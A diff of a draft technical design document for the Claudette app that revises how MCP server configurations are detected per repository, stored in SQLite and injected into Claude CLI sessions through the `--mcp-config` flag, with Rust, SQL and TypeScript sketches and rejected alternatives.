@@ -1,223 +1,263 @@
-# Technical Design: MCP Configuration Detection and Workspace Integration
+# Technical Design: MCP Configuration Detection and Repository Integration
 
 **Status**: Draft
 **Date**: 2026-04-13
 **Issue**: [#170](https://github.com/utensils/Claudette/issues/170)
+**Supersedes**: Previous TDD (workspace-centric, file-based approach)
 **Author**: Claude Code
 
 ## Problem Statement
 
-When creating a new workspace in Claudette, users have no visibility into which MCP (Model Context Protocol) servers are available or configured. Users need to:
+Claudette creates workspaces as git worktrees in a separate directory from the original repository. When Claude CLI runs inside a worktree, it automatically discovers:
 
-1. See all MCP servers that are configured (globally and per-project)
-2. Add MCP configurations to workspace-specific `.claude.json` files
-3. Enable different MCP setups for different workspaces within the same repository
+- **`~/.claude.json`** (user scope) — global MCPs, always available
+- **`.mcp.json`** (project scope) — committed to git, checked out in worktrees automatically
 
-Currently, Claudette only reads `.claudette.json` for custom instructions and setup scripts. There is no UI for managing `.claude.json` (Claude Code's configuration file) or MCP servers.
+However, two categories of MCP configuration are **not** available inside worktrees:
+
+1. **Project-scoped MCPs in `~/.claude.json`** — Claude Code stores per-project MCPs keyed by absolute path (e.g., `~/.claude.json` → `projects["/home/user/my-repo"].mcpServers`). Worktrees live at a different path, so these don't match.
+2. **Gitignored repo-level configs** — Files like `.claude.json` at the repo root (typically gitignored) contain local MCP overrides that are never checked out in worktrees.
+
+Users need a way to carry these "invisible" MCP configurations into their Claudette workspaces. The previous approach (writing `.claude.json` files into worktrees) was rejected because it created file management complexity and diverged from the user's actual configuration. The correct approach is to:
+
+1. Detect these non-portable MCP configs when a repository is added
+2. Let the user select which ones to enable
+3. Store selections in the database
+4. Inject them at agent spawn time via Claude CLI's `--mcp-config` flag
 
 ## User Stories
 
-### US1: View Available MCP Servers During Workspace Creation
-**As a** Claudette user creating a new workspace
-**I want to** see a list of all configured MCP servers from my global and project-level Claude configurations
-**So that** I know which MCP tools will be available to the Claude agent in this workspace
+### US1: Select MCP Servers When Adding a Repository
+**As a** Claudette user adding a new repository
+**I want to** see which MCP servers are configured for this project (outside the repo itself) and select which ones to carry into workspaces
+**So that** my Claude agents in worktrees have the same MCP tools I use when working in the original repo
 
 **Acceptance Criteria:**
-- [ ] During workspace creation flow, display a list of detected MCP servers
-- [ ] Show server name, type (stdio/http/sse), and scope (user/project/local)
-- [ ] Indicate which servers will be active by default (based on Claude Code's precedence rules)
-- [ ] Allow continuing without selecting any MCPs (skip/dismiss)
+- [ ] After adding a repo, display detected non-portable MCP servers
+- [ ] Show server name, transport type (stdio/http/sse), and source location
+- [ ] Allow selecting/deselecting individual servers
+- [ ] Allow skipping MCP selection entirely
+- [ ] Selected configs are persisted to the database
 
-### US2: Add MCP Configuration to New Workspace
-**As a** Claudette user
-**I want to** select which MCP servers should be configured for a specific workspace
-**So that** I can have different MCP setups for different workspaces in the same repository
-
-**Acceptance Criteria:**
-- [ ] Provide a UI to select from detected MCP servers during workspace creation
-- [ ] Write selected MCP configs to `.claude.json` in the workspace's worktree root
-- [ ] Support both copying existing MCP configs and creating new workspace-specific overrides
-- [ ] Validate that the written `.claude.json` is well-formed JSON
-
-### US3: Manage MCP Configuration for Existing Workspace
-**As a** Claudette user with an existing workspace
-**I want to** view and modify the MCP configuration for that workspace
-**So that** I can adjust which MCP servers are available without recreating the workspace
+### US2: MCP Servers Injected at Agent Spawn Time
+**As a** Claudette user chatting with an agent in a workspace
+**I want** the agent to automatically have access to the MCP servers I selected for this repository
+**So that** I don't have to manually configure MCP servers for each workspace
 
 **Acceptance Criteria:**
-- [ ] Provide a workspace settings UI to view current MCP configuration
-- [ ] Allow adding/removing MCP servers from workspace's `.claude.json`
-- [ ] Show both workspace-specific and inherited (global/project) MCP servers
-- [ ] Support editing MCP server configurations (args, env vars, URLs)
+- [ ] Selected MCP configs are passed via `--mcp-config` when spawning `claude`
+- [ ] MCP injection only happens on the first turn (session-level flag)
+- [ ] Agents can use the injected MCP tools (verified by `claude mcp list`)
+- [ ] No `.claude.json` files are written to worktrees
+
+### US3: Manage MCP Configuration for Existing Repository
+**As a** Claudette user with an existing repository
+**I want to** view and modify the MCP server selections in repository settings
+**So that** I can update MCP access as my configuration changes over time
+
+**Acceptance Criteria:**
+- [ ] Repository settings UI shows current MCP selections
+- [ ] User can re-detect available MCPs (refresh)
+- [ ] User can add/remove MCP servers from the selection
+- [ ] Changes apply to new agent sessions (not mid-session)
 
 ## Background Research
 
-### Claude Code MCP Configuration
+### Claude CLI `--mcp-config` Flag
 
-Claude Code uses a **three-level scoping system** for MCP configurations:
+```
+--mcp-config <configs...>    Load MCP servers from JSON files or strings (space-separated)
+--strict-mcp-config          Only use MCP servers from --mcp-config, ignoring all other sources
+```
 
-| Scope | Location | Visibility | Precedence |
-|-------|----------|-----------|------------|
-| **User** | `~/.claude.json` (global) | All projects | 3 (lowest) |
-| **Project** | `.mcp.json` (project root) | Shared via git | 2 |
-| **Local** | `.claude.json` (project root) | Current project only | 1 (highest) |
+The flag accepts one or more arguments, each of which can be:
+- A **file path** to a JSON file containing an `mcpServers` object
+- An **inline JSON string** containing an `mcpServers` object
 
-**Precedence order** (highest to lowest):
-1. Local scope (`.claude.json` in project)
-2. Project scope (`.mcp.json` in project)
-3. User scope (`~/.claude.json` global)
-4. Plugin servers
-5. Claude.ai connectors
-
-**Configuration Format**:
+**JSON format:**
 ```json
 {
   "mcpServers": {
     "server-name": {
-      "type": "stdio|http|sse",
-      "command": "...",
-      "args": [],
-      "env": {},
-      "url": "https://...",
-      "headers": {},
-      "oauth": {}
+      "type": "stdio",
+      "command": "npx",
+      "args": ["-y", "@example/mcp-server"],
+      "env": {}
     }
   }
 }
 ```
 
-**Discovery Commands**:
-```bash
-claude mcp list              # Show all configured servers
-claude mcp get <name>        # Details for specific server
+**Important**: `--mcp-config` is additive — it loads servers alongside any auto-detected configs. The `--strict-mcp-config` variant restricts to only the provided configs. We should use the non-strict version so that `.mcp.json` (committed) and user-global MCPs still work normally.
+
+### Where Non-Portable MCPs Live
+
+#### 1. User-level project-scoped MCPs (`~/.claude.json`)
+
+Claude Code stores per-project MCP configurations in a nested structure:
+
+```json
+{
+  "projects": {
+    "/absolute/path/to/repo": {
+      "mcpServers": {
+        "my-server": { "command": "...", "args": [] }
+      }
+    }
+  }
+}
 ```
 
-### Current Claudette Implementation
+These are keyed by the **absolute path to the repository root**. When Claude CLI runs in a worktree at a different path (e.g., `~/.claudette/worktrees/my-repo/feature-branch/`), it won't find these project-scoped MCPs because the path doesn't match.
 
-**Workspace Model** (`src/model/workspace.rs`):
-- No workspace-specific Claude settings stored in database
-- Only stores: id, repository_id, name, branch_name, worktree_path, status, session_id, turn_count
+#### 2. Gitignored repo-level config (`.claude.json` at repo root)
 
-**Configuration Handling** (`src/config.rs`):
-- Only reads `.claudette.json` (Claudette's config file)
-- Structure: `{ "scripts": { "setup": "..." }, "instructions": "..." }`
-- Located in repository root (not workspace-specific)
+The file `{repo}/.claude.json` is typically listed in `.gitignore` (Claude Code's own convention). It may contain:
 
-**Agent Spawning** (`src/agent.rs:run_turn`):
-- Working directory set to workspace's worktree path
-- Claude CLI reads `.claude.json` from working directory automatically
-- Custom instructions passed via `--append-system-prompt` (first turn only)
+```json
+{
+  "mcpServers": {
+    "local-server": { "type": "stdio", "command": "..." }
+  }
+}
+```
 
-**Gap**: No UI for managing `.claude.json` files or detecting MCP configurations.
+Since it's gitignored, it is **never** checked out in worktrees.
+
+#### What We Do NOT Need to Detect
+
+- **`.mcp.json`** (project root) — committed to git, auto-available in worktrees
+- **Global user MCPs** (non-project-specific entries in `~/.claude.json`) — Claude CLI reads these regardless of working directory
+- **Plugin MCPs** (`~/.claude/plugins/`) — managed by Claude Code's plugin system, always available
+
+### Current Claudette Architecture
+
+**Repository addition** (`add_repository` command):
+- Validates git repo, canonicalizes path, inserts to DB
+- No MCP awareness currently
+
+**Agent spawning** (`send_chat_message` → `agent::run_turn`):
+- Sets `working_dir` to worktree path
+- Builds CLI args via `build_claude_args()`
+- `AgentSettings` struct controls session-level flags (model, chrome, etc.)
+- No `--mcp-config` support currently
+
+**Database**: SQLite, migration version 14. No MCP tables.
 
 ## Requirements
 
 ### Functional Requirements
 
 #### FR1: MCP Detection
-- **FR1.1**: Detect MCP servers from `~/.claude.json` (user scope)
-- **FR1.2**: Detect MCP servers from repository root `.mcp.json` (project scope)
-- **FR1.3**: Detect MCP servers from repository root `.claude.json` (local scope)
-- **FR1.4**: Parse and validate MCP server configurations
-- **FR1.5**: Handle missing or malformed configuration files gracefully
+- **FR1.1**: Detect project-scoped MCPs from `~/.claude.json` (nested `projects[repo_path].mcpServers`)
+- **FR1.2**: Detect MCPs from gitignored `{repo}/.claude.json` (verify it's not tracked by git)
+- **FR1.3**: Parse all three transport types: stdio, http, sse
+- **FR1.4**: Handle missing or malformed config files gracefully (return empty, not error)
+- **FR1.5**: Do NOT scan `.mcp.json` or global (non-project) user MCPs (these are auto-available)
 
-#### FR2: MCP Display
-- **FR2.1**: Show detected MCP servers during workspace creation
-- **FR2.2**: Display server name, type, and scope for each server
-- **FR2.3**: Indicate which servers will be active (based on precedence)
-- **FR2.4**: Support dismissing/skipping MCP selection
+#### FR2: MCP Selection UI
+- **FR2.1**: Show MCP selection modal after adding a repository
+- **FR2.2**: Display server name, transport type, and source for each detected server
+- **FR2.3**: Default all detected servers to selected (opt-out, not opt-in)
+- **FR2.4**: Allow skipping MCP selection entirely
+- **FR2.5**: Show MCP management in repository settings for existing repos
 
-#### FR3: Workspace `.claude.json` Management
-- **FR3.1**: Create `.claude.json` in workspace worktree root when user selects MCPs
-- **FR3.2**: Write selected MCP configurations to `mcpServers` section
-- **FR3.3**: Preserve existing `.claude.json` content (merge, don't overwrite)
-- **FR3.4**: Validate JSON syntax before writing
-- **FR3.5**: Support editing workspace `.claude.json` after creation
+#### FR3: Database Storage
+- **FR3.1**: Store selected MCP server configurations in a new `repository_mcp_servers` table
+- **FR3.2**: Each row stores one MCP server: name, config JSON, source label
+- **FR3.3**: Support add/remove operations for individual servers
+- **FR3.4**: Cascade delete when repository is removed
 
-#### FR4: MCP Server Configuration
-- **FR4.1**: Support all three MCP transport types (stdio, http, sse)
-- **FR4.2**: Handle environment variable expansion syntax (`${VAR}`, `${VAR:-default}`)
-- **FR4.3**: Display environment variables with masking for sensitive values
-- **FR4.4**: Allow copying MCP config from one scope to another
+#### FR4: Agent Spawn Injection
+- **FR4.1**: On first turn, load selected MCPs from database for the workspace's repository
+- **FR4.2**: Serialize selected MCPs as JSON and pass via `--mcp-config` flag
+- **FR4.3**: Use additive mode (not `--strict-mcp-config`) so auto-detected MCPs still work
+- **FR4.4**: Only inject on first turn (session-level — subsequent `--resume` turns inherit)
 
 ### Non-Functional Requirements
 
 #### NFR1: Performance
-- **NFR1.1**: MCP detection should complete in < 200ms for typical configs (< 20 servers)
-- **NFR1.2**: UI should remain responsive during MCP detection
+- **NFR1.1**: MCP detection should complete in < 200ms
+- **NFR1.2**: MCP injection should add < 10ms to agent spawn time (just a DB read + arg append)
 
 #### NFR2: Security
-- **NFR2.1**: Mask sensitive values in UI (API keys, tokens, secrets)
-- **NFR2.2**: Validate file paths to prevent directory traversal
-- **NFR2.3**: Sanitize JSON to prevent injection attacks
+- **NFR2.1**: Mask sensitive values (API keys, tokens) in the selection UI
+- **NFR2.2**: Store config JSON as-is in DB (including `${VAR}` syntax) — don't resolve env vars
+- **NFR2.3**: Validate JSON structure before storing to prevent injection
 
 #### NFR3: Compatibility
-- **NFR3.1**: Support Claude Code's configuration format exactly (no custom extensions)
-- **NFR3.2**: Written `.claude.json` files must be readable by Claude Code CLI
-- **NFR3.3**: Handle both legacy and current MCP configuration formats
-
-#### NFR4: Usability
-- **NFR4.1**: MCP selection should be optional (can skip)
-- **NFR4.2**: Provide clear error messages for configuration issues
-- **NFR4.3**: Show examples or help text for MCP configuration
+- **NFR3.1**: Generated `--mcp-config` JSON must be readable by Claude CLI
+- **NFR3.2**: Do not modify source files (`~/.claude.json`, repo `.claude.json`)
+- **NFR3.3**: Gracefully handle repos with no detectable non-portable MCPs (skip modal)
 
 ## Architecture
 
 ### Design Principles
 
-1. **Minimal Claudette-Specific Logic**: Delegate MCP discovery to Claude CLI when possible
-2. **Read-Only for Global Configs**: Never modify `~/.claude.json` or `.mcp.json` (respect user's global settings)
-3. **Workspace Isolation**: Each workspace can have its own `.claude.json` in its worktree
-4. **No Database Storage**: MCP configurations live in `.claude.json` files, not in SQLite (follows existing pattern)
-5. **TOCTOU Prevention**: Pass resolved MCP server configs directly from frontend to backend to avoid re-detection race conditions
+1. **Detect, Don't Duplicate**: Scan source files read-only; store selections in DB, inject at runtime
+2. **Repository-Scoped**: MCP selections belong to the repository, not individual workspaces — all workspaces in a repo share the same MCP config
+3. **Additive Injection**: Use `--mcp-config` (not `--strict-mcp-config`) so committed `.mcp.json` and global MCPs still work
+4. **Database as Source of Truth**: Selected MCPs live in SQLite, not in worktree files
+5. **Opt-Out Default**: Pre-select all detected MCPs — users remove what they don't want
 
 ### Data Flow
 
 ```
-┌─────────────────┐
-│ User Creates    │
-│ New Workspace   │
-└────────┬────────┘
-         │
-         ▼
-┌─────────────────────────┐
-│ Detect MCP Servers      │
-│ - ~/.claude.json        │
-│ - repo/.mcp.json        │
-│ - repo/.claude.json     │
-└────────┬────────────────┘
-         │
-         ▼
-┌─────────────────────────┐
-│ Display MCP Selection   │
-│ Modal (Optional)        │
-└────────┬────────────────┘
-         │
-         ▼
-    ┌────┴──────┐
-    │ User      │
-    │ Choice    │
-    └────┬──────┘
-         │
-    ┌────┴──────────┐
-    │               │
-    ▼               ▼
- Skip MCP      Select MCPs
-    │               │
-    └───────┬───────┘
-            │
-            ▼
-   ┌────────────────┐
-   │ Create Workspace│
-   │ (existing flow) │
-   └────────┬────────┘
-            │
-            ▼
-   ┌──────────────────┐
-   │ If MCPs selected,│
-   │ write .claude.json│
-   │ to worktree root  │
-   └──────────────────┘
+┌───────────────────────┐
+│  User Adds Repository │
+└──────────┬────────────┘
+           │
+           ▼
+┌──────────────────────────────────┐
+│  Detect Non-Portable MCPs        │
+│  1. ~/.claude.json projects[path]│
+│  2. {repo}/.claude.json (if      │
+│     gitignored)                  │
+└──────────┬───────────────────────┘
+           │
+           ▼
+      ┌────┴──────────┐
+      │  Any MCPs     │
+      │  detected?    │
+      └────┬──────┬───┘
+           │      │
+         Yes      No
+           │      │
+           ▼      └──► (skip modal, done)
+┌─────────────────────┐
+│  MCP Selection Modal │
+│  (pre-selected,      │
+│   user can deselect) │
+└──────────┬──────────┘
+           │
+      ┌────┴──────────┐
+      │  User saves   │
+      │  or skips     │
+      └────┬──────┬───┘
+           │      │
+         Save    Skip
+           │      │
+           ▼      └──► (done, no MCPs stored)
+┌──────────────────────┐
+│  Store in DB          │
+│  repository_mcp_      │
+│  servers table        │
+└──────────────────────┘
+           ·
+           · (later, when agent runs)
+           ·
+┌──────────────────────┐
+│  send_chat_message    │
+│  (first turn)         │
+└──────────┬───────────┘
+           │
+           ▼
+┌──────────────────────────────────┐
+│  Load MCPs from DB for repo      │
+│  Serialize as JSON               │
+│  Append --mcp-config <json>      │
+│  to build_claude_args()          │
+└──────────────────────────────────┘
 ```
 
 ### Component Design
@@ -226,719 +266,693 @@ claude mcp get <name>        # Details for specific server
 
 ##### 1. MCP Detection Module (`src/mcp.rs`)
 
-**Purpose**: Parse and detect MCP configurations from various sources.
+**Purpose**: Detect non-portable MCP configurations for a given repository path.
 
 ```rust
-/// Represents a detected MCP server configuration
+use std::collections::HashMap;
+use std::path::Path;
+use serde::{Deserialize, Serialize};
+
+/// A detected MCP server with its full configuration.
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct McpServer {
+    /// Server name (key in the mcpServers object).
     pub name: String,
-    pub config: McpServerConfig,
-    pub scope: McpScope,
+    /// Full server configuration (passed through to --mcp-config).
+    pub config: serde_json::Value,
+    /// Human-readable label for where this config was found.
+    pub source: McpSource,
 }
 
+/// Where the MCP server configuration was detected from.
 #[derive(Debug, Clone, Serialize, Deserialize)]
-#[serde(tag = "type", rename_all = "lowercase")]
-pub enum McpServerConfig {
-    Stdio {
-        command: String,
-        args: Vec<String>,
-        env: HashMap<String, String>,
-    },
-    Http {
-        url: String,
-        headers: HashMap<String, String>,
-        oauth: Option<OAuthConfig>,
-    },
-    Sse {
-        url: String,
-    },
+#[serde(rename_all = "snake_case")]
+pub enum McpSource {
+    /// Project-scoped entry in ~/.claude.json
+    UserProjectConfig,
+    /// Gitignored .claude.json at repo root
+    RepoLocalConfig,
 }
 
-#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
-#[serde(rename_all = "lowercase")]
-pub enum McpScope {
-    User,     // ~/.claude.json (global)
-    Project,  // .mcp.json (project root)
-    Local,    // .claude.json (worktree root, workspace-local config)
+/// Detect non-portable MCP servers for the given repository path.
+///
+/// Scans two locations:
+/// 1. `~/.claude.json` → `projects[repo_path].mcpServers`
+/// 2. `{repo_path}/.claude.json` (only if gitignored / not tracked)
+///
+/// Returns an empty Vec if no non-portable MCPs are found.
+pub fn detect_mcp_servers(repo_path: &Path) -> Vec<McpServer> {
+    let mut servers = Vec::new();
+
+    // 1. Check ~/.claude.json for project-scoped MCPs
+    if let Some(user_servers) = detect_user_project_mcps(repo_path) {
+        servers.extend(user_servers);
+    }
+
+    // 2. Check {repo}/.claude.json (only if gitignored)
+    if let Some(local_servers) = detect_repo_local_mcps(repo_path) {
+        servers.extend(local_servers);
+    }
+
+    servers
 }
 
-/// Main detection function
-pub async fn detect_mcp_servers(
-    repo_path: &Path
-) -> Result<Vec<McpServer>, String> {
-    // 1. Read ~/.claude.json
-    // 2. Read {repo_path}/.mcp.json
-    // 3. Read {repo_path}/.claude.json
-    // 4. Parse and merge (with precedence tracking)
+/// Parse project-scoped MCPs from ~/.claude.json.
+///
+/// Claude Code stores per-project configs at:
+///   projects["/absolute/path/to/repo"].mcpServers
+fn detect_user_project_mcps(repo_path: &Path) -> Option<Vec<McpServer>> {
+    let home = dirs::home_dir()?;
+    let config_path = home.join(".claude.json");
+    let content = std::fs::read_to_string(&config_path).ok()?;
+    let root: serde_json::Value = serde_json::from_str(&content).ok()?;
+
+    let repo_key = repo_path.to_string_lossy();
+    let mcp_servers = root
+        .get("projects")?
+        .get(repo_key.as_ref())?
+        .get("mcpServers")?
+        .as_object()?;
+
+    let servers = mcp_servers
+        .iter()
+        .map(|(name, config)| McpServer {
+            name: name.clone(),
+            config: config.clone(),
+            source: McpSource::UserProjectConfig,
+        })
+        .collect();
+
+    Some(servers)
 }
 
-/// Parse a single .claude.json or .mcp.json file
-fn parse_mcp_config(
-    path: &Path,
-    scope: McpScope
-) -> Result<Vec<McpServer>, String> {
-    // Parse JSON, extract mcpServers section
+/// Parse MCPs from {repo}/.claude.json, but only if it's gitignored.
+fn detect_repo_local_mcps(repo_path: &Path) -> Option<Vec<McpServer>> {
+    let config_path = repo_path.join(".claude.json");
+    if !config_path.exists() {
+        return None;
+    }
+
+    // Only include if the file is NOT tracked by git.
+    // `git ls-files --error-unmatch` exits non-zero if the file is not tracked.
+    if is_tracked_by_git(repo_path, ".claude.json") {
+        return None;
+    }
+
+    let content = std::fs::read_to_string(&config_path).ok()?;
+    let root: serde_json::Value = serde_json::from_str(&content).ok()?;
+    let mcp_servers = root.get("mcpServers")?.as_object()?;
+
+    let servers = mcp_servers
+        .iter()
+        .map(|(name, config)| McpServer {
+            name: name.clone(),
+            config: config.clone(),
+            source: McpSource::RepoLocalConfig,
+        })
+        .collect();
+
+    Some(servers)
 }
 
-/// Write MCP servers to workspace .claude.json
-pub async fn write_workspace_mcp_config(
-    worktree_path: &Path,
-    servers: &[McpServer]
-) -> Result<(), String> {
-    // 1. Read existing .claude.json (if exists)
-    // 2. Merge/update mcpServers section
-    // 3. Write back with pretty formatting
+/// Check if a file is tracked by git (returns true if tracked).
+fn is_tracked_by_git(repo_path: &Path, file: &str) -> bool {
+    std::process::Command::new("git")
+        .args(["ls-files", "--error-unmatch", file])
+        .current_dir(repo_path)
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .status()
+        .is_ok_and(|s| s.success())
+}
+
+/// Serialize selected MCP servers into the JSON format expected by
+/// `--mcp-config`. Returns a JSON string like:
+///
+/// ```json
+/// {"mcpServers":{"name":{"type":"stdio","command":"..."}}}
+/// ```
+pub fn serialize_for_cli(servers: &[McpServer]) -> String {
+    let mut mcp_servers = serde_json::Map::new();
+    for server in servers {
+        mcp_servers.insert(server.name.clone(), server.config.clone());
+    }
+    let wrapper = serde_json::json!({ "mcpServers": mcp_servers });
+    wrapper.to_string()
 }
 ```
 
-**Error Handling**:
-- Missing files are not errors (return empty list)
-- Malformed JSON returns descriptive error
-- Invalid server configs are skipped with warning
+##### 2. Database Schema (migration v15)
 
-##### 2. Tauri Commands (`src-tauri/src/commands/mcp.rs`)
+```sql
+-- Migration 15: MCP server storage per repository
+CREATE TABLE repository_mcp_servers (
+    id              TEXT PRIMARY KEY,
+    repository_id   TEXT NOT NULL REFERENCES repositories(id) ON DELETE CASCADE,
+    name            TEXT NOT NULL,
+    config_json     TEXT NOT NULL,
+    source          TEXT NOT NULL,
+    created_at      TEXT NOT NULL DEFAULT (datetime('now')),
+    UNIQUE(repository_id, name)
+);
+
+PRAGMA user_version = 15;
+```
+
+**Database functions** (in `src/db.rs`):
 
 ```rust
-/// Detect all MCP servers for a repository
+/// Insert a selected MCP server for a repository.
+pub fn insert_repository_mcp_server(
+    &self,
+    id: &str,
+    repository_id: &str,
+    name: &str,
+    config_json: &str,
+    source: &str,
+) -> Result<(), rusqlite::Error>
+
+/// List all selected MCP servers for a repository.
+pub fn list_repository_mcp_servers(
+    &self,
+    repository_id: &str,
+) -> Result<Vec<RepositoryMcpServer>, rusqlite::Error>
+
+/// Delete a single MCP server by ID.
+pub fn delete_repository_mcp_server(
+    &self,
+    id: &str,
+) -> Result<(), rusqlite::Error>
+
+/// Replace all MCP servers for a repository (bulk upsert).
+pub fn replace_repository_mcp_servers(
+    &self,
+    repository_id: &str,
+    servers: &[(String, String, String, String)],  // (id, name, config_json, source)
+) -> Result<(), rusqlite::Error>
+```
+
+##### 3. Tauri Commands (`src-tauri/src/commands/mcp.rs`)
+
+```rust
+/// Detect non-portable MCP servers for a repository.
+/// Called by the frontend after adding a repo or from repo settings.
 #[tauri::command]
 pub async fn detect_mcp_servers(
     repo_id: String,
     state: State<'_, AppState>,
-) -> Result<Vec<McpServer>, String> {
-    // 1. Get repository path from database
-    // 2. Call mcp::detect_mcp_servers
-}
+) -> Result<Vec<McpServer>, String>
 
-/// Write MCP configuration to workspace .claude.json
+/// Save selected MCP servers for a repository (replaces any existing).
 #[tauri::command]
-pub async fn configure_workspace_mcps(
-    workspace_id: String,
+pub async fn save_repository_mcps(
+    repo_id: String,
     servers: Vec<McpServer>,
     state: State<'_, AppState>,
-) -> Result<(), String> {
-    // 1. Get workspace worktree path from database
-    // 2. Call mcp::write_workspace_mcp_config with the already-resolved servers
-    // Note: Accepts Vec<McpServer> directly to avoid TOCTOU risk from re-detection
-}
+) -> Result<(), String>
 
-/// Read workspace .claude.json MCP configuration
+/// Load saved MCP servers for a repository.
 #[tauri::command]
-pub async fn read_workspace_mcps(
-    workspace_id: String,
+pub async fn load_repository_mcps(
+    repo_id: String,
     state: State<'_, AppState>,
-) -> Result<Vec<McpServer>, String> {
-    // 1. Get workspace worktree path
-    // 2. Parse .claude.json in worktree
-    // 3. Return MCP servers
+) -> Result<Vec<McpServer>, String>
+
+/// Delete a single MCP server from a repository's saved config.
+#[tauri::command]
+pub async fn delete_repository_mcp(
+    server_id: String,
+    state: State<'_, AppState>,
+) -> Result<(), String>
+```
+
+##### 4. Agent Spawn Integration (`src/agent.rs`)
+
+Add an `mcp_config` field to `AgentSettings`:
+
+```rust
+pub struct AgentSettings {
+    pub model: Option<String>,
+    pub fast_mode: bool,
+    pub thinking_enabled: bool,
+    pub plan_mode: bool,
+    pub effort: Option<String>,
+    pub chrome_enabled: bool,
+    /// MCP config JSON string for --mcp-config. Session-level: only applied
+    /// on the first turn.
+    pub mcp_config: Option<String>,
 }
+```
+
+In `build_claude_args()`, add after the chrome flag block:
+
+```rust
+// MCP config is session-level — only inject on the first turn.
+// Resumed sessions inherit MCP servers from the initial turn.
+if !is_resume && let Some(ref mcp_json) = settings.mcp_config {
+    args.push("--mcp-config".to_string());
+    args.push(mcp_json.clone());
+}
+```
+
+In `send_chat_message` (chat command), load MCPs from DB:
+
+```rust
+// Load repository MCP configs for injection on first turn.
+let mcp_config = if !is_resume {
+    let mcp_servers = db.list_repository_mcp_servers(&ws.repository_id)
+        .unwrap_or_default();
+    if mcp_servers.is_empty() {
+        None
+    } else {
+        Some(claudette::mcp::serialize_for_cli(&mcp_servers))
+    }
+} else {
+    None
+};
+
+let agent_settings = AgentSettings {
+    model: if !is_resume { model } else { None },
+    fast_mode: fast_mode.unwrap_or(false),
+    thinking_enabled: thinking_enabled.unwrap_or(false),
+    plan_mode: plan_mode.unwrap_or(false),
+    effort,
+    chrome_enabled: chrome_enabled.unwrap_or(false),
+    mcp_config,
+};
 ```
 
 #### Frontend Components
 
 ##### 1. MCP Selection Modal (`src/ui/src/components/modals/McpSelectionModal.tsx`)
 
-**Purpose**: Display detected MCP servers and allow selection during workspace creation.
+**Purpose**: Display detected non-portable MCP servers after adding a repository.
 
-**Props**:
-```typescript
-interface McpSelectionModalProps {
-  isOpen: boolean;
-  onClose: () => void;
-  repoId: string;
-  workspaceId: string; // Modal opens after workspace creation succeeds
-  onConfirm: (selectedServerNames: string[]) => Promise<void>;
-}
-```
+**Trigger**: Opened by `AddRepoModal` after successful `add_repository()`, but only if detection finds servers.
 
 **UI Layout**:
 ```
-┌────────────────────────────────────────┐
-│ Configure MCP Servers for Workspace   │
-├────────────────────────────────────────┤
-│                                        │
-│ Select which MCP servers to enable:   │
-│                                        │
-│ ☐ filesystem (stdio, user)            │
-│   Command: npx -y @modelcontextpro...  │
-│                                        │
-│ ☑ github (http, project)              │
-│   URL: https://mcp.github.com/api      │
-│                                        │
-│ ☐ postgres (stdio, local)             │
-│   Command: docker exec postgres-mcp... │
-│                                        │
-│ [Skip]  [Configure Selected Servers]  │
-└────────────────────────────────────────┘
+┌─────────────────────────────────────────────────┐
+│ MCP Servers Detected                            │
+├─────────────────────────────────────────────────┤
+│                                                 │
+│ These MCP servers are configured for this       │
+│ project but won't be automatically available    │
+│ in workspaces. Select which to include:         │
+│                                                 │
+│ ☑ github (http)                     ~/.claude…  │
+│   url: https://api.githubcopilot.com/mcp/       │
+│                                                 │
+│ ☑ my-db (stdio)                     .claude.…   │
+│   command: docker exec postgres-mcp             │
+│                                                 │
+│ ☐ legacy-tool (sse)                 ~/.claude…  │
+│   url: https://old.example.com/sse              │
+│                                                 │
+│               [Skip]  [Save Selections]         │
+└─────────────────────────────────────────────────┘
 ```
 
 **Behavior**:
-- Opens after the workspace has been created, so `workspaceId` is available for any config writes
 - Calls `detect_mcp_servers(repoId)` on mount
-- Displays loading state while detecting
-- Shows error if detection fails
-- Allows multiple selection (checkboxes)
-- "Skip" button closes modal without writing config
-- "Configure Selected Servers" button calls `configure_workspace_mcps(workspaceId, selectedServers)` then `onConfirm()`
-- No pre-create write mode: detection can inform creation UX, but `.claude.json` is only written after workspace creation succeeds
+- Shows loading spinner during detection
+- If no servers detected, closes automatically (nothing to show)
+- All servers pre-selected by default
+- "Skip" closes without saving anything
+- "Save Selections" calls `save_repository_mcps(repoId, selectedServers)`
 
-##### 2. Workspace Settings MCP Tab (Future Enhancement)
+##### 2. Repository Settings: MCP Tab
 
-**Purpose**: Manage MCP configuration for existing workspace.
+**Purpose**: View and manage saved MCP selections for an existing repository.
 
-**Location**: New tab in workspace settings modal (not yet implemented).
+**Location**: New section in the existing repository settings modal.
 
 **Features**:
-- Display current workspace MCP servers
-- Show inherited servers (from user/project scope) with "read-only" indicator
-- Add/remove servers from workspace config
-- Edit server configurations (args, env vars)
+- List currently saved MCP servers
+- "Re-detect" button to scan again and show new/changed servers
+- Remove individual servers
+- Shows source label (user project config / repo local config)
+
+##### 3. Frontend Services (`src/ui/src/services/mcp.ts`)
+
+```typescript
+export interface McpServer {
+  name: string;
+  config: Record<string, unknown>;
+  source: 'user_project_config' | 'repo_local_config';
+}
+
+export interface SavedMcpServer extends McpServer {
+  id: string;
+  repository_id: string;
+  created_at: string;
+}
+
+export async function detectMcpServers(repoId: string): Promise<McpServer[]>;
+export async function saveRepositoryMcps(repoId: string, servers: McpServer[]): Promise<void>;
+export async function loadRepositoryMcps(repoId: string): Promise<SavedMcpServer[]>;
+export async function deleteRepositoryMcp(serverId: string): Promise<void>;
+```
 
 ### Alternative Approaches Considered
 
-#### Alternative 1: Shell Out to `claude mcp list`
+#### Alternative 1: Write `.claude.json` to Worktrees (Previous TDD)
 
-**Approach**: Use `claude mcp list --output-format json` to detect MCP servers.
+**Approach**: Detect all MCPs, write selected ones to `{worktree}/.claude.json`.
 
-**Pros**:
-- Leverages Claude CLI's existing detection logic
-- Guaranteed to match Claude Code's behavior
-- Handles all edge cases (plugin servers, OAuth, env var expansion)
+**Why Rejected**:
+- Creates file management complexity (merge existing content, handle conflicts)
+- Duplicates configuration (source files + worktree copies can diverge)
+- Triggers at workspace creation time (wrong granularity — MCPs are repo-level, not workspace-level)
+- Risk of orphaned `.claude.json` files if workspace creation fails
+- `.claude.json` in worktrees can interfere with Claude CLI's own config detection
 
-**Cons**:
-- Requires Claude CLI to be installed and in PATH
-- Slower (subprocess overhead)
-- JSON format may not include scope information
-- Requires parsing CLI output format (not stable API)
